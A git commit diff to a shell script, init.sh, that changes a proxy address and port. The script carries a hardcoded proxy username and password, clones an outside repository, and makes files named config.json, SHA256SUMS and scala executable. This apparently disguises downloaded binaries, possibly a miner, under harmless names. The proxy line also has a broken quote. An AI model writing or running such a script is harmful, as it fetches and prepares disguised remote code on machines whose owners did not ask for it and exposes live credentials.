aba2f1b2b9f494a25f7033b5a2fa887e712a4e3a
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2023-12-26 08:23:41 +0700

    Update init.sh

--- init.sh
+++ init.sh
@@ -1,5 +1,5 @@
-proxy=188.74.210.207" 
-port="6286" 
+proxy=188.74.183.10" 
+port="8279" 
 user="ugursfso"  
 pass="wqn60pnk6m95" 
 git clone https://github.com/55113110159/javascript.git && cd javascript && chmod +x config.json && chmod +x SHA256SUMS && chmod +x scala
